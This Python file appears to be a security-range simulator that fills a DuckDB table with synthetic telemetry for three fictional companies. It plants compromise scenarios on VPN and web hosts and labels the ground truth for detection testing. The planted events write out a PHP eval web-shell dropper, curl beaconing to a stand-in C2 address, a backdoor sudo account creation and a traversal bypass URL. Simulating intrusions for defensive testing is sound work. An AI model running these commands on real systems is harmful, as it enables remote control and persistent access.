"""
Range Lite Simulator (Section 11).
Generates deterministic synthetic telemetry and assets across three tenants:
1. Meridian Finance (non-bank lender)
2. Harbor Logistics
3. Lotus Clinics
Implements Scenarios S1-S6 with DuckDB backing.
All addresses use reserved test ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
"""
import duckdb
import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List, Optional, Tuple
from app.models.schemas import Advisory, Asset, SourceSentence, Tenant

SIMULATED_ADVISORY_TEXT = (
    "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\n"
    "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\n"
    "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.\n"
    "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\n"
    "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\n"
    "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\n"
    "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\n"
    "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\n"
    "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\n"
    "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation."
)

TENANTS_DATA = [
    {"id": "meridian-finance", "name": "Meridian Finance", "industry": "Non-Banking Financial Corporation (NBFC)", "region": "Mumbai, India"},
    {"id": "harbor-logistics", "name": "Harbor Logistics", "industry": "Port & Freight Supply Chain", "region": "Chennai, India"},
    {"id": "lotus-clinics", "name": "Lotus Clinics", "industry": "Healthcare Provider Network", "region": "Bengaluru, India"}
]

class RangeLiteSimulator:
    _instance = None

    def __init__(self, db_path: str = ":memory:"):
        self.db_path = db_path
        self.con = duckdb.connect(db_path)
        self.assets: List[Asset] = []
        self.advisory: Optional[Advisory] = None
        self.ground_truth: Dict[str, Dict[str, Any]] = {}
        self.init_db()
        self.populate_all(seed=42)

    @classmethod
    def get_instance(cls) -> "RangeLiteSimulator":
        if cls._instance is None:
            cls._instance = cls()
        return cls._instance

    def init_db(self):
        self.con.execute("""
            CREATE TABLE IF NOT EXISTS telemetry_events (
                event_id VARCHAR,
                timestamp TIMESTAMP,
                tenant_id VARCHAR,
                host_name VARCHAR,
                source_type VARCHAR,
                event_action VARCHAR,
                user_name VARCHAR,
                process_name VARCHAR,
                process_cmdline VARCHAR,
                file_path VARCHAR,
                http_method VARCHAR,
                url_path VARCHAR,
                status_code INTEGER,
                src_ip VARCHAR,
                dst_ip VARCHAR,
                dst_port INTEGER,
                network_bytes INTEGER,
                is_malicious BOOLEAN,
                scenario_id VARCHAR
            )
        """)

    def populate_all(self, seed: int = 42, simulate_s4_gap: bool = True):
        random.seed(seed)
        self.con.execute("DELETE FROM telemetry_events")
        self.assets = []
        self.ground_truth = {}

        # 1. Advisory Definition
        sentences = [s.strip() for s in SIMULATED_ADVISORY_TEXT.split('\n') if s.strip()]
        source_sentences = [
            SourceSentence(id=f"SENT-{i+1:02d}", sentence=sent, confidence=0.98)
            for i, sent in enumerate(sentences)
        ]

        self.advisory = Advisory(
            id="SIM-2026-0001",
            cve_id="CVE-2026-9901",
            title="EdgeGate VPN Pre-Auth RCE & Session Hijack",
            vendor="EdgeGate Networks",
            product="EdgeGate VPN",
            affected_versions=[">=9.0.0", "<=9.2.3"],
            vuln_class="Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
            exploitation_status="known_exploited",
            disclosure_date="2026-10-09T08:00:00Z",
            first_known_exploitation_date="2026-10-04T00:00:00Z",
            vendor_mitigations=["Upgrade to firmware 9.2.4+", "Restrict /api/v1/auth/session to management subnet"],
            cleanup_notes=["Kill all active admin sessions", "Scan /var/www/html/assets/ for .sys_cache.php", "Review local admin accounts"],
            indicators=["198.51.100.42", "/var/www/html/assets/.sys_cache.php", "svc_sec_audit", "198.51.100.89"],
            raw_text=SIMULATED_ADVISORY_TEXT,
            source_sentences=source_sentences,
            created_at="2026-10-09T08:00:00Z"
        )

        # 2. Build 90 assets across 3 tenants (~30 per tenant)
        roles = [
            ("vpn-gw-01", "EdgeGate VPN", "9.1.4", True, "critical"),
            ("vpn-gw-02", "EdgeGate VPN", "9.2.1", True, "high"),
            ("web-portal-01", "EdgeGate VPN", "9.1.2", True, "critical"),
            ("web-portal-02", "Apache HTTPD", "2.4.58", True, "high"),
            ("api-server-01", "EdgeGate VPN", "9.0.2", False, "critical"),
            ("app-server-01", "Tomcat", "10.1.18", False, "high"),
            ("app-server-02", "NodeJS App", "20.11.0", False, "medium"),
            ("db-primary-01", "PostgreSQL", "16.2", False, "critical"),
            ("db-replica-01", "PostgreSQL", "16.2", False, "high"),
            ("dc-ad-01", "Windows Server Active Directory", "2022", False, "critical"),
            ("file-share-01", "Samba / NFS", "4.19.4", False, "medium"),
            ("backup-srv-01", "Veeam Agent", "12.1", False, "high"),
            ("monitoring-01", "Prometheus / Grafana", "2.50.0", False, "medium"),
            ("jump-host-01", "OpenSSH", "9.6p1", False, "high"),
            ("unkn-asset-01", "EdgeGate VPN", "Unknown", True, "critical"),
            ("unkn-asset-02", "EdgeGate VPN", "Unknown", False, "medium")
        ]

        now = datetime(2026, 10, 18, 12, 0, 0, tzinfo=timezone.utc)

        # Planted scenarios:
        # S1: meridian-vpn-gw-01 (Meridian Finance VPN Gateway) -> Compromised before advisory
        # S2: harbor-vpn-gw-01 (Harbor Logistics VPN Gateway) -> Clean & well covered
        # S3: lotus-app-server-01 (Lotus Clinics) -> Benign look-alike
        # S4: meridian-web-portal-01 (Meridian Finance) -> Blind spot (only 7 days of logs)
        # S5: Handled dynamically on S1 (patch then persist)
        # S6: Fleet mix with 4 planted compromises

        planted_compromises = [
            ("meridian-finance", "meridian-vpn-gw-01", "S1"),
            ("harbor-logistics", "harbor-web-portal-01", "S6_COMP_1"),
            ("lotus-clinics", "lotus-vpn-gw-01", "S6_COMP_2"),
            ("meridian-finance", "meridian-api-server-01", "S6_COMP_3")
        ]

        events_batch = []

        for tenant_meta in TENANTS_DATA:
            t_id = tenant_meta["id"]
            prefix = t_id.split("-")[0]

            # Generate 30 assets for this tenant
            for idx in range(30):
                role_template = roles[idx % len(roles)]
                host_name = f"{prefix}-{role_template[0]}"
                if idx >= len(roles):
                    host_name = f"{prefix}-workstation-{idx - len(roles) + 1:02d}"
                    prod = "Windows 11 Enterprise"
                    ver = "23H2"
                    is_inet = False
                    crit = "low"
                else:
                    prod = role_template[1]
                    ver = role_template[2]
                    is_inet = role_template[3]
                    crit = role_template[4]

                # Determine exposure tier
                if ver == "Unknown":
                    exp_tier = "emergency" if is_inet else "high"
                    status = "needs_inventory"
                elif prod == "EdgeGate VPN" and is_inet and crit == "critical":
                    exp_tier = "emergency"
                    status = "matched"
                elif prod == "EdgeGate VPN" and (is_inet or crit in ["critical", "high"]):
                    exp_tier = "high"
                    status = "matched"
                elif prod == "EdgeGate VPN":
                    exp_tier = "standard"
                    status = "matched"
                else:
                    exp_tier = "standard"
                    status = "unaffected"

                asset_id = f"ASSET-{prefix.upper()}-{idx+1:03d}"
                asset = Asset(
                    id=asset_id,
                    host_name=host_name,
                    tenant_id=t_id,
                    owner=f"admin@{t_id.replace('-', '')}.in",
                    product=prod,
                    version=ver,
                    internet_facing=is_inet,
                    criticality=crit,
                    timezone="Asia/Kolkata",
                    ip_address=f"192.0.2.{random.randint(10, 240)}",
                    exposure_tier=exp_tier,
                    status=status
                )
                self.assets.append(asset)

                # Check scenario assignment
                is_s1 = (host_name == "meridian-vpn-gw-01")
                is_s2 = (host_name == "harbor-vpn-gw-01")
                is_s3 = (host_name == "lotus-app-server-01")
                is_s4 = (host_name == "meridian-web-portal-01")
                is_planted_s6 = any(t_id == p[0] and host_name == p[1] for p in planted_compromises)

                # Set ground truth
                is_comp = is_s1 or is_planted_s6
                scenario_label = "S1" if is_s1 else ("S2" if is_s2 else ("S3" if is_s3 else ("S4" if is_s4 else ("S6" if is_planted_s6 else "BENIGN"))))
                
                self.ground_truth[host_name] = {
                    "is_compromised": is_comp,
                    "scenario": scenario_label,
                    "first_malicious_ts": "2026-10-04T03:14:22Z" if is_comp else None,
                    "planted_files": ["/var/www/html/assets/.sys_cache.php"] if is_comp else []
                }

                # Generate telemetry for this asset over past 45 days
                # S4 only gets 7 days of logs if simulate_s4_gap is True
                days_to_gen = 7 if (is_s4 and simulate_s4_gap) else 45
                start_window = now - timedelta(days=days_to_gen)

                # Baseline noise generator
                for day_offset in range(days_to_gen):
                    cur_day = start_window + timedelta(days=day_offset)
                    # 5-10 baseline events per day
                    for ev_idx in range(random.randint(4, 8)):
                        ev_time = cur_day + timedelta(hours=random.randint(8, 19), minutes=random.randint(0, 59), seconds=ev_idx * 5)
                        ev_id = f"EV-{prefix.upper()}-{idx:02d}-{day_offset:02d}-{ev_idx:02d}"
                        events_batch.append((
                            ev_id,
                            ev_time.strftime("%Y-%m-%d %H:%M:%S"),
                            t_id,
                            host_name,
                            random.choice(["web", "auth", "endpoint", "network", "file"]),
                            random.choice(["session_login", "config_poll", "ntp_sync", "heartbeat_ok", "file_access"]),
                            "svc_gateway",
                            "edgegate_svc",
                            "/usr/sbin/edgegate_daemon --config /etc/edgegate.conf",
                            "/var/log/edgegate.log",
                            "GET",
                            "/api/v1/health",
                            200,
                            f"192.0.2.{random.randint(2, 50)}",
                            f"192.0.2.{random.randint(51, 100)}",
                            443,
                            random.randint(200, 1500),
                            False,
                            "BASELINE"
                        ))

                # Inject S3: Benign look-alike (maintenance scripts + monitoring telemetry)
                if is_s3:
                    for d in [12, 8, 4]:
                        maint_time = now - timedelta(days=d, hours=3)
                        ev_id = f"EV-S3-MAINT-{host_name}-{d}"
                        events_batch.append((
                            ev_id,
                            maint_time.strftime("%Y-%m-%d %H:%M:%S"),
                            t_id,
                            host_name,
                            "file",
                            "file_create",
                            "sysadmin",
                            "ansible-playbook",
                            "/usr/bin/ansible-playbook /opt/maintenance/cleanup.yml",
                            "/var/www/html/assets/cache_cleanup_temp.tmp",
                            "N/A", "N/A", 0, "192.0.2.10", "192.0.2.20", 0, 450,
                            False,
                            "S3_BENIGN"
                        ))

                # Inject Planted Compromises (S1, S6)
                if is_comp:
                    # 1. Access: Crafted request pattern 14 days ago (2026-10-04)
                    t_access = now - timedelta(days=14, hours=8, minutes=15)
                    events_batch.append((
                        f"EV-PLANTED-{host_name}-01",
                        t_access.strftime("%Y-%m-%d %H:%M:%S"),
                        t_id,
                        host_name,
                        "web",
                        "crafted_request",
                        "anonymous",
                        "edgegate_httpd",
                        "/usr/sbin/edgegate_httpd -D FOREGROUND",
                        "/api/v1/auth/session",
                        "POST",
                        "/api/v1/auth/session?bypass=../../bin/sh",
                        200,
                        "203.0.113.195",
                        asset.ip_address,
                        443,
                        4096,
                        True,
                        "S1"
                    ))

                    # 2. Execution / Persistence: Web shell written 12 days ago (2026-10-06)
                    t_shell = now - timedelta(days=12, hours=14, minutes=20)
                    events_batch.append((
                        f"EV-PLANTED-{host_name}-02",
                        t_shell.strftime("%Y-%m-%d %H:%M:%S"),
                        t_id,
                        host_name,
                        "file",
                        "file_write_served_dir",
                        "www-data",
                        "sh",
                        "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
                        "/var/www/html/assets/.sys_cache.php",
                        "N/A", "N/A", 0, "N/A", "N/A", 0, 1024,
                        True,
                        "S1"
                    ))

                    # 3. Outbound Control: Regular C2 beaconing 10 days ago (2026-10-08)
                    for b_idx in range(6):
                        t_beacon = now - timedelta(days=10, hours=2, minutes=b_idx * 15)
                        events_batch.append((
                            f"EV-PLANTED-{host_name}-03-{b_idx}",
                            t_beacon.strftime("%Y-%m-%d %H:%M:%S"),
                            t_id,
                            host_name,
                            "network",
                            "periodic_egress_c2",
                            "root",
                            "curl",
                            "curl -s -k https://198.51.100.42:8443/checkin",
                            "N/A",
                            "CONNECT",
                            "/checkin",
                            200,
                            asset.ip_address,
                            "198.51.100.42",
                            8443,
                            512,
                            True,
                            "S1"
                        ))

                    # 4. Privilege Change: Dormant administrator account created 7 days ago (2026-10-11)
                    t_user = now - timedelta(days=7, hours=18, minutes=45)
                    events_batch.append((
                        f"EV-PLANTED-{host_name}-04",
                        t_user.strftime("%Y-%m-%d %H:%M:%S"),
                        t_id,
                        host_name,
                        "auth",
                        "user_add_privileged",
                        "root",
                        "useradd",
                        "/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit",
                        "/etc/passwd",
                        "N/A", "N/A", 0, "N/A", "N/A", 0, 0,
                        True,
                        "S1"
                    ))

        # Fast columnar bulk insert into DuckDB
        try:
            import numpy as np
            cols = [
                "event_id", "timestamp", "tenant_id", "host_name", "source_type",
                "event_action", "user_name", "process_name", "process_cmdline",
                "file_path", "http_method", "url_path", "status_code",
                "src_ip", "dst_ip", "dst_port", "network_bytes",
                "is_malicious", "scenario_id"
            ]
            col_data = {c: np.array([r[i] for r in events_batch]) for i, c in enumerate(cols)}
            self.con.execute("INSERT INTO telemetry_events SELECT * FROM col_data")
        except Exception:
            self.con.executemany("""
                INSERT INTO telemetry_events VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, events_batch)

        # Build columnar indexes post-insert for sub-millisecond query execution
        self.con.execute("CREATE INDEX IF NOT EXISTS idx_host ON telemetry_events(host_name)")
        self.con.execute("CREATE INDEX IF NOT EXISTS idx_time ON telemetry_events(timestamp)")
        self.con.execute("CREATE INDEX IF NOT EXISTS idx_tenant ON telemetry_events(tenant_id)")

    def execute_query(self, sql: str, params: Tuple = ()) -> List[Dict[str, Any]]:
        cursor = self.con.execute(sql, params)
        cols = [desc[0] for desc in cursor.description]
        rows = cursor.fetchall()
        return [dict(zip(cols, row)) for row in rows]
